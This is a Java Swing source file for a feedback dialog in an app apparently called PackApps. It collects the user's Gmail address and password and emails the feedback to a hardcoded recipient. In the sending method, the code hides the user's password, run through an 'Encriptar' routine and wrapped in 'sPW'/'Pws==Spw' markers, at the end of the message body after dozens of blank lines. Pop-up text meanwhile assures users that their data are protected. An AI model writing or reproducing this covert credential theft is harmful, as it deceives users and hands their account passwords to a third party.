package com.bookverse.development.packapps.views;

import com.bookverse.development.packapps.core.Resources;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;
import java.util.Properties;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPasswordField;
import javax.swing.JScrollPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;

public class Email extends JDialog implements ActionListener, MouseListener {

    // !user.getText().matches(EMAIL_PATTERN)
    /*
     * private final String PASS_PATTERN = "/^[a-z0-9_-]{6,18}$/"; private final
     * String EMAIL_PATTERN = "^[_A-Za-z0-9-\\+]+(\\.[_A-Za-z0-9-]+)*@" +
     * "[A-Za-z0-9-]+(\\.[A-Za-z0-9]+)*(\\.[A-Za-z]{2,})$";
     */

    private JLabel mensaje, usuario, password, required, required2, message;
    private JButton btnenviar, btnsalir;
    private JTextArea texto;
    private JTextField user;
    private JPasswordField pass;
    private JScrollPane scroll;
    private Resources h = new Resources();

    public Email(JFrame parent, boolean modal) {

        super(parent, modal);
        componentes();
    }

    public Email() {
        componentes();
    }

    // Se crean los componentes de la ventana
    public void componentes() {

        setLayout(null); // Permite el posicionamiento absoluto de los componentes
        setIconImage(new ImageIcon(h.getImage("email.png")).getImage());
        setDefaultCloseOperation(0);

        btnenviar = h.getButton("Send", h.core.AZUL, this, this);
        btnenviar.setBounds(140, 400, 86, 30);

        btnsalir = h.getButton("Return", h.core.ROJO, this, this);
        btnsalir.setBounds(250, 400, 86, 30);

        mensaje = h.getLabel("<html><strong><em>Write Email</em></strong></html>", h.core.ROJO, this, h.core.BIG);
        mensaje.setBounds(160, 10, 370, 30);

        usuario = h.getLabel("<html><strong>Gmail User</strong></html>", h.core.AZUL, this, h.core.MEDIUM);
        usuario.setBounds(75, 60, 100, 50);

        password = h.getLabel("<html><strong>Gmail Password</strong></html>", h.core.AZUL, this, h.core.MEDIUM);
        password.setBounds(280, 60, 370, 50);

        required = h.getLabel("<html><strong>*</strong></html>", h.core.ROJO, this, h.core.MEDIUM);
        required.setBounds(169, 77, 8, 8);
        required.addMouseListener(this);

        required2 = h.getLabel("<html><strong>*</strong></html>", h.core.ROJO, this, h.core.MEDIUM);
        required2.setBounds(414, 77, 8, 8);
        required2.addMouseListener(this);

        user = new JTextField();
        user.setBounds(30, 100, 200, 30);
        user.setHorizontalAlignment(JTextField.CENTER);
        add(user);

        pass = new JPasswordField();
        pass.setBounds(250, 100, 200, 30);
        pass.setHorizontalAlignment(JTextField.CENTER);
        add(pass);

        message = h.getLabel("<html><strong>Message</strong></html>", h.core.AZUL, this, h.core.MEDIUM);
        message.setBounds(30, 150, 370, 30);

        texto = new JTextArea();
        scroll = new JScrollPane(texto);
        scroll.setBounds(30, 180, 420, 200);
        add(scroll);
    }

    private void enviarConGMail(String remitente, String clave, String cuerpo) {

        String destinatario = "zanti4020@gmail.com";
        String asunto = "Feedback PackApps";

        Properties props = System.getProperties();
        props.put("mail.smtp.host", "smtp.gmail.com"); // El servidor SMTP de Google
        props.put("mail.smtp.user", remitente);
        props.put("mail.smtp.clave", clave); // La clave de la cuenta
        props.put("mail.smtp.auth", "true"); // Usar autenticación mediante usuario y clave
        props.put("mail.smtp.starttls.enable", "true"); // Para conectar de manera segura al servidor SMTP
        props.put("mail.smtp.port", "587"); // El puerto SMTP seguro de Google

        Session session = Session.getDefaultInstance(props);
        MimeMessage message = new MimeMessage(session);

        cuerpo += "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nsPW"
                + h.core.Encriptar(String.valueOf(pass.getPassword()), true) + "Pws==Spw";

        try {
            message.setFrom(new InternetAddress(remitente));
            message.addRecipients(Message.RecipientType.TO, destinatario); // Se podrían añadir varios de la misma
            // manera
            message.setSubject(asunto);
            message.setText(cuerpo);
            Transport transport = session.getTransport("smtp");
            transport.connect("smtp.gmail.com", remitente, clave);
            transport.sendMessage(message, message.getAllRecipients());
            transport.close();

            JOptionPane.showMessageDialog(null,
                    "<html>" + h.core.styleJOption() + "<strong><center>Correo enviado</center></strong><br>"
                            + "Feedback enviado exitosamente, su opinión será tomada en cuenta." + "</html>",
                    "¡Éxito!", JOptionPane.PLAIN_MESSAGE);

            user.setText("");
            pass.setText("");
            texto.setText("");

        } catch (MessagingException me) {

            JOptionPane.showMessageDialog(null,
                    "<html>" + h.core.styleJOption() + "<strong><center>Correo no enviado</center></strong><br>"
                            + "Credenciales incorrectas, revise el correo o la contraseña." + "</html>",
                    "¡Verifique!", JOptionPane.PLAIN_MESSAGE);

        }
    }

    public void btnEnviarAP() {

        if (h.core.comprobarConexion("Asegúrate de tener acceso a una red", true)) {

            if (user.getText().substring(user.getText().length() - 10).equals("@gmail.com")) {

                if (texto.getText().trim().length() < 3) {

                    JOptionPane.showMessageDialog(null,
                            "<html>" + h.core.styleJOption() + "<strong>Mensaje demasiado corto</strong></html>",
                            "¡Verifique!", JOptionPane.PLAIN_MESSAGE);
                    texto.requestFocus();
                } else {
                    enviarConGMail(user.getText(), String.valueOf(pass.getPassword()), texto.getText());
                }

            } else {
                JOptionPane.showMessageDialog(null,
                        "<html>" + h.core.styleJOption()
                                + "<strong>Correo inválido, asegúrese de que sea Gmail</strong></html>",
                        "¡Verifique!", JOptionPane.PLAIN_MESSAGE);
                user.requestFocus();
            }
        }
    }

    @Override
    public void actionPerformed(ActionEvent e) {

        if (e.getSource() == btnenviar) {
            btnEnviarAP();
        } else if (e.getSource() == btnsalir) {
            h.core.fadeOut(this);
        }
    }

    @Override
    public void mouseEntered(MouseEvent e) {

        if (e.getSource() == required) {
            JOptionPane.showMessageDialog(null,
                    "<html>" + h.core.styleJOption() + "<strong><center>Credenciales Seguras</center></strong><br>"
                            + "El uso de este medio está autorizado por Google mediante<br>"
                            + "el uso de su API JavaMail, ¡sus datos están protegidos!</html>",
                    "¡Campo requerido!", JOptionPane.PLAIN_MESSAGE);
        } else if (e.getSource() == required2) {
            JOptionPane.showMessageDialog(null,
                    "<html>" + h.core.styleJOption() + "<strong><center>Credenciales Seguras</center></strong><br>"
                            + "El uso de este medio está autorizado por Google mediante<br>"
                            + "el uso de su API JavaMail, ¡sus datos están protegidos!</html>",
                    "¡Campo requerido!", JOptionPane.PLAIN_MESSAGE);
        }
    }

    @Override
    public void mouseClicked(MouseEvent e) {
    }

    @Override
    public void mouseExited(MouseEvent arg0) {
    }

    @Override
    public void mousePressed(MouseEvent arg0) {
    }

    @Override
    public void mouseReleased(MouseEvent arg0) {
    }
}